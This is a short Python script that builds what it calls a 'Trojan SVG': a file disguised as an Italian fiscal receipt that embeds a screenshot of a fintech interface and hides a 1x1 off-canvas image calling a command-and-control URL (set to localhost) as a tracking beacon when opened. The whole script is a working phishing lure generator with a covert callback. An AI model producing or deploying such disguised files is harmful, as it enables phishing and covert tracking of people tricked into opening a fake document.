import base64

# Configuration
IMAGE_PATH = r"C:\Users\dacan\.gemini\antigravity\brain\b8a5f486-01af-4515-b1f2-fd39e1c68e3f\direct_ui_screenshot_fintech_1767147573099.png"
SVG_OUTPUT_PATH = r"C:\Users\dacan\OneDrive\Desktop\Chimera\ricevuta_fiscale_N4992.svg"
C2_URL = "http://127.0.0.1:5000"

def create_trojan_svg():
    print(f"Reading image from: {IMAGE_PATH}")
    with open(IMAGE_PATH, "rb") as image_file:
        encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
    
    # Construct SVG content
    svg_content = f"""<svg width="100%" height="100%" viewBox="0 0 800 1200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image width="800" height="1200" xlink:href="data:image/png;base64,{encoded_string}" />
    <image width="1" height="1" x="-10" y="-10" xlink:href="{C2_URL}/track?source=svg_receipt" />
</svg>"""

    print(f"Writing SVG to: {SVG_OUTPUT_PATH}")
    with open(SVG_OUTPUT_PATH, "w") as svg_file:
        svg_file.write(svg_content)
    
    print("Done! Trojan SVG created.")

if __name__ == "__main__":
    create_trojan_svg()
